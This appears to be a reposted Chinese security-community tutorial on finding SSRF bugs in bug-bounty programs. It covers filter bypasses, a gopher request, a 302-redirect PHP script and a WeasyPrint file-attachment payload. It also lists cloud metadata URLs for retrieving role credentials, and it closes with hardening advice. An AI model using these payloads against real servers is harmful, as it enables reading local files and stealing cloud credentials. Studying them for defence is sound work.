#  转发先知社区《SRC中的SSRF漏洞挖掘笔记1.0》   
先知社区  黑伞安全   2023-06-27 18:03  
  
原文地址：https://xz.aliyun.com/t/12227  
# SRC中的SSRF小记  
## ssrf - 漏洞简介  
  
SSRF全称：Server-Side Request Forgery，即 服务器端请求伪造。是一个由攻击者构造请求，在目标服务端执行的一个安全漏洞。攻击者可以利用该漏洞使服务器端向攻击者构造的任意域发出请求，目标通常是从外网无法访问的内部系统。简单来说就是利用服务器漏洞以服务器的身份发送一条构造好的请求给服务器所在内网进行攻击。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/ZS0VQrDMfGpgdLZh8uSaic8kQneU3LuG1VXYo6KBWRcE3EyHtEMNZvYJ2YrObluLiaZZ21d5e3b1B7KF0ujUxeoQ/640?wx_fmt=png "")  
## ssrf - 漏洞原理  
  
SSRF全称为Server-side Request Fogery,中文含义为服务器端请求伪造，漏洞产生的原因是服务端提供了能够从其他服务器应用获取数据的功能，比如从指定的URL地址获取网页内容，加载指定地址的图片、数据、下载等等。漏洞URL示例: http://xxx.com/api/readFiles?url=http://10.1.11/xxx  
## ssrf - 漏洞危害  
  
1、可以对服务器所在的内网环境进行端口扫描、资源访问  
  
2、利用漏洞和Payload进一步攻击运行其他的应用程序;  
  
3、对内网web应用进行指纹识别，通过访问应用存在的默认文件实现  
  
4、GET型漏洞利用，GET参数就可以实现的攻击，比如struts2漏洞利用等  
  
5、POST型漏洞利用，可利用gopher协议进行参数构造;  
  
6、利用Redis未授权访问getshell、Weblogic默认SSRF漏洞页面  
  
7、如果ssrf漏洞存在于云服务器  
```
攻击元数据服务
攻击存储桶
攻击Kubelet API
越权攻击云平台内其他组件或服务
```  
## ssrf - 场景及参数  
### 常见场景:  
  
1、通过URL地址进行网页分享;  
```
http://share.xxx.com/index.php?url=http://www.xxx.com
```  
  
2、转码服务，通过URL地址把原地址的网页转换格式  
  
3、图片加载与下载，一般是通过url参数进行图片获取  
```
http://image.xxx.com/image.php?image=http://www.xxx.com
```  
  
4、未公开的api实现以及其他调用url的功能;  
  
5、设备后台管理进行存活测试;  
  
6、远程资源调用功能;  
  
7、数据库内置功能;  
  
8、编辑器进行远程图片抓取，如: ueditor;  
  
9、打包附件或者内容编辑并导出时  
  
10、PDF生成或导出  
### 常见参数:  
```
share、wap、url、link、src、source、target、u、3g、display、sourceURl、imageURL、domain...
```  
## ssrf - 漏洞成因  
### 产生漏洞的函数  
  
根据后台使用的函数的不同，相应的影响和利用方法也不一样，PHP中下面函数的使用不当会导致SSRF:  
```
file_get_contents()
fsockopen()
curl_exec()
```  
#### file_get_contents()  
  
这个函数的作用是将整个文件读入一个字符串中，并且此函数是用于把文件的内容读入到一个字符串中的首选方法。  
  
比如：下面的代码执行结果是输出test.txt文件里面的字符串。  
```
<?php
echo file_get_contents(“test.txt”);
?>
```  
#### fsockopen()  
  
使用fsockopen函数实现获取用户制定url的数据（文件或者html）。  
#### curl_exec()  
  
该函数可以执行给定的curl会话。  
  
[root@localhost]# curl -V  
```
curl 7.83.1 (Windows) libcurl/7.83.1 Schannel
Release-Date: 2022-05-13
Protocols: dict file ftp ftps http https imap imaps pop3 pop3s smtp smtps telnet tftp
Features: AsynchDNS HSTS IPv6 Kerberos Largefile NTLM SPNEGO SSL SSPI UnixSockets
```  
## ssrf - 利用协议  
  
SSRF常用的攻击协议: http(s)、file、dict、**gopher**  
  
Http协议: 最常用的SSRF漏洞利用协议，作用为直接访问http资源。如: http://xxx.com/api/readFiles?url=http.//10.1.1.1/x  
  
File协议:可利用此协议进行服务器文件读取如:http://xxx.com/api/readFiles?url=file:///ete/passwd  
  
Dict协议:可用此协议进行端口开放探测如:http://xxx.com/api/readFiles?url=dict//1000.1:22  
  
Gopher协议: gopher支持发出GET、POST请求，可进行复杂的漏洞利用例如，内网中的一处其他的漏洞URL为: http://xxx.com/get.php?name=admin尝试用gopher协议调用此代码，先构造一个GET请求体:  
```
GET /get.php?name=admin HTTP/1.1Host:192.168.1.120
```  
  
转化为gopher协议请求:  
```
gopher://192.168.1.120:80/ GET%20/get.php%3fname=admin%20HTTP/1.1%0d%0aHost:xxx.com%0d%0aRequest
```  
## ssrf - 常用绕过方法  
  
由于SSRF漏洞危害较大，并且容易出现在各种功能点中，因此开发人员常常对请求资源的域名、IP进行白名单或者黑名单的限制过滤。  
  
一般情况下利用URL解析导致SSRF过滤被绕过基本上都是**因为后端通过不正确的正则表达式对URL进行了解析**。  
### 绕过某种特定限制  
#### @符: 绕过域名  
  
一般用于http://www.xxx.com等域名不可更改  
  
例如http://www.xxx.com@10.10.10.10，则实际上访问的是 10.10.10.10  
#### /#/符:绕过后缀  
  
一般用于.jpg等固定后缀不可更改  
  
例如http://10.10.10.10:5001/#/abc.jpg，实际在浏览器访问的是 http://10.10.10.10:5001  
### 绕过限制请求IP不为内网地址  
#### 1、点分割符号替换:  
  
在浏览器中可以使用不同的分割符号来代替域名中的.分割，可以使用。、｡、．来代替  
  
例如：  
```
```  
#### 2、xip.io:  
  
10.10.10.10.xip.io 会被解析成10.10.10.10  
#### 3、数字IP地址:  
  
127.0.0.1的十进制: 2130706433，HTTP访问: http://2130706433/  
#### 4、短网址：  
```
https://www.985.so/
```  
#### 5、进制转换:  
  
127.0.0.1的八进制: 0177.0.0.1，十六进制: 0x7f.0.0.1  
#### 6、封闲式字母数字(Enclosed Alphanumerics):  
  
ⓔⓧⓐⓜⓟⓛⓔ.ⓒⓞⓜ >>> example.com ①②⑦. ⓪.⓪.①>>> 127.0.0.1  
#### 7、DNS重绑定:  
  
一般进行 ssrf 防御的模式如下：  
  
![](https://mmbiz.qpic.cn/mmbiz_png/ZS0VQrDMfGpgdLZh8uSaic8kQneU3LuG17ZjF8ofy026JiczMNp4QlwyccRz3lBNIJIrBob0gr34aAzcMCH5cdew/640?wx_fmt=png "")  
  
1. 获取到输入的URL，从该URL中提取host  
  
对该host进行DNS解析，获取到解析的IP  
  
1. 访问规则判断该IP是否在指定范围内（即判断IP是否符合规则）  
  
如果IP在范围内，即对此URL发起请求  
  
如果IP不在范围内，则请求失败  
  
然而访问规则在判段得到的IP为指定范围内IP，到服务端请求URL这个中间还存在一个细微的时间差，  
  
DNS重绑定则是利用这一点，让服务器第一次解析host的ip为符合规则的公网IP，在第二次请求解析URL时host的ip又变为了不符合规则的内网IP，从而进行ssrf。  
  
这里推荐使用burpsuite的intruder模块，来批量发送请求，以利用时间差完成ssrf。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/ZS0VQrDMfGpgdLZh8uSaic8kQneU3LuG1NuRXkQgKS6ruNMlH2MdoFiabmxK9wwTbpsYDysCm4JcrV5d1f8w06Sg/640?wx_fmt=png "")  
  
  
在线DNS重绑定平台：https://lock.cmpxchg8b.com/rebinder.html  
#### 8、302重定向：  
  
需要一个vps，把302转换的代码部署到vps上，然后去访问，就可跳转到内网中  
  
服务端代码如下：  
```
<?php 
header("Location: http://192.168.1.10");
exit(); 
?>
```  
#### 9、绕过localhost:  
```
```  
### 协议限制绕过:  
  
如禁用了部分协议，尝试转换使用协议;  
```
http(s)、file、dict、gopher、（sftp、ldap、tftp）
```  
## ssrf - 漏洞案例  
#### 导入/导出型ssrf（无回显）  
  
漏洞原理：在导入/上传图片、数据等内容时时将图片链接换成dnslog链接，服务器则在请求资源时会访问dnslog链接  
  
Vps 设置 302 跳转 访问内网  
```
302.php 
<?php
header("HTTP/1.1 302 found"); 
header("Location:http://10.x.x.x:5001/index?host=dnslog.requestrepo.com"); 
exit(); 
?>
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/ZS0VQrDMfGpgdLZh8uSaic8kQneU3LuG1nrrboia1r3EGB37j3xyB6p11J5SnKgbYYq9icSHHVTiaNN10fH3cSZtrw/640?wx_fmt=png "")  
  
  
POST /api/apimanage/trans/getThirdPartSwaggerJsonByAddr/ HTTP/1.1  
  
Host: apicloud.xxx.com  
  
Cookie:xxx=xxx  
  
{"addr":"http://106.12.xx.xx/302.php"}  
  
![](https://mmbiz.qpic.cn/mmbiz_png/ZS0VQrDMfGpgdLZh8uSaic8kQneU3LuG18PgBLQnhYJ5SaCQE9J23dh1kbkkO4frPF7Zdfa71OjJMk9oaMLRyuA/640?wx_fmt=png "")  
  
#### HTML导出PDF下的ssrf（组件）  
  
WeasyPrint是一个用于HTML和CSS的可视化渲染引擎，可以将HTML文档导出为打印标准的PDF文件。  
```
WeasyPrint重新定义了一组html标签，包括img，embed，object等。根据我们之前的测试，我们已经知道javascript不是利用这一点的选项。在这一点上，我们的希望很低，我们开始认为PDF生成器不再可利用，直到我们发现对<链接>内部的几个文件的引用，包括pdf.py。这使我们能够通过使用 将任何网页或本地文件的内容附加到我们的 PDF 中。
<link rel=attachment href="file:///root/secret.txt">
```  
  
特殊标签用法：在html标签前的双引号符号(”)，补充单引号（'），会被允许在PDF中解析  
  
最终使用<iframe>遵循特殊标签用法处理插入后，成功外连，漏洞存在  
  
![](https://mmbiz.qpic.cn/mmbiz_png/ZS0VQrDMfGpgdLZh8uSaic8kQneU3LuG1GmuXfVqqSfz3aCOyYrIbZ0nfaXXGxZiblVgy91IVe91OxeDPRJOcbAw/640?wx_fmt=png "")  
  
  
进一步利用  
  
使用file协议，获取敏感文件  
```
<link rel=attachment href="file:///root/secret.txt">
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/ZS0VQrDMfGpgdLZh8uSaic8kQneU3LuG10vXWWjmNTH2KwJlPPTwc1obICmFBebX1Muv0G4XX3RJE2JSXCTJXMw/640?wx_fmt=png "")  
  
#### 云上ssrf利用  
  
云服务器一般会公开每个实例的内部服务(一般在帮助文档中都能查看)  
  
如果发现云服务器中的 SSRF 漏洞，可以直接查询主机实例的元数据从⽽进⼀步深⼊利⽤。  
  
腾讯云：  
```
访问元数据

http://metadata.tencentyun.com/latest/meta-data/ 获取 metadata 版本信息。

查询实例元数据。

http://metadata.tencentyun.com/latest/meta-data/placement/region

获取实例物理所在地信息。

http://metadata.tencentyun.com/latest/meta-data/local-ipv4 

获取实例内⽹ IP。实例存在多张⽹卡时，返回 eth0 设备的⽹络地址。

http://metadata.tencentyun.com/latest/meta-data/public-ipv4

获取实例公⽹ IP。

http://metadata.tencentyun.com/network/interfaces/macs/${mac}/vpc-id

实例⽹络接⼝ VPC ⽹络 ID。

在获取到⻆⾊名称后，可以通过以下链接取⻆⾊的临时凭证，${role-name} 为 CAM ⻆⾊

的名称：

http://metadata.tencentyun.com/latest/meta-data/cam/security-credentials/${role

name}
```  
  
阿里云：  
```
查看实例元数据的根目录

http://100.100.100.200/latest/meta-data

查看实例ID：

http://100.100.100.200/latest/meta-data/instance-id

访问RAM 角色的临时凭证：

http://100.100.100.200/latest/meta-data/ram/security-credentials/

获取AK SK信息
http://100.100.100.200/latest/meta-data/ram/security-credentials/huocorp-terraform-goat-role
```  
  
具体云上ssrf漏洞案例可自行查看文章:  
```
https://www.wangan.com/p/7fy784ff26339e4e
https://hackerone.com/reports/341876
http://www.myzaker.com/article/60c181bb8e9f0941bb67ffac
https://help.aliyun.com/document_detail/108460.html#section-w35-csp-imo
```  
## ssrf - 加固和防御  
  
内网环境下ssrf1.去除url中的特殊字符2.将域名解析为IP，对内网IP进行限制3.不跟随30x跳转（跟随跳转需要从1开始重新检测）4.禁用高危协议，例如：gopher、dict、ftp、file等，只允许http/https5.请求时设置host header为ip6.统一错误信息，避免用户可以根据错误信息来判断远程服务器的端口状态。  
  
云上ssrf  
1. 加固模式加固模式下，实例基于token鉴权查看实例元数据，相比普通模式对SSRF攻击有更好的防范效果。  
  
1. 普通模式限制用户RAM角色权限，只赋予自己所需要的权限，这样可以将影响程度降到最低。  
  
（ 以下为阿里云官方文档中普通模式和加固模式的对比）  
  
![](https://mmbiz.qpic.cn/mmbiz_png/ZS0VQrDMfGpgdLZh8uSaic8kQneU3LuG1gAKa3gDyiaqcJ2ztVQTSyxZ6UPxCdaxnhkDKhXAbdCKszdPS52buG4A/640?wx_fmt=png "")  
  
## 参考文章:  
  
http://blog.leanote.com/post/snowming/e2c24cf057a4  
  
[https://mp.weixin.qq.com/s/RWmyPp9CBFjANz162_fBgA?exportid=export/UzFfAgtgekIEAQAAAAAAiqcJ9zQpKgAAAAstQy6ubaLX4KHWvLEZgBPE7YFwdxMPKLqBzNPgMItebr37kwBZSL05nyRkt6-j&sessionid=-1948127107](https://mp.weixin.qq.com/s?__biz=MzIzODAwMTYxNQ==&mid=2652143323&idx=1&sn=acdc7e43d01d70b6f09575c4f66f6eed&exportid=export/UzFfAgtgekIEAQAAAAAAiqcJ9zQpKgAAAAstQy6ubaLX4KHWvLEZgBPE7YFwdxMPKLqBzNPgMItebr37kwBZSL05nyRkt6-j&sessionid=-1948127107&scene=21#wechat_redirect)  
  
  
https://aws.amazon.com/cn/blogs/china/talking-about-the-metadata-protection-on-the-instance-from-the-data-leakage-of-capital-one/  
  
https://zhuanlan.zhihu.com/p/419610674  
  
https://cloud.tencent.com/developer/article/1942119  
  
https://blog.csdn.net/qq_43531669/article/details/113052373  
  
https://help.aliyun.com/document_detail/108460.htm?spm=a2c4g.11186623.0.0.61c42032asxaiH#concept-dwj-y1x-wgb  
  
  
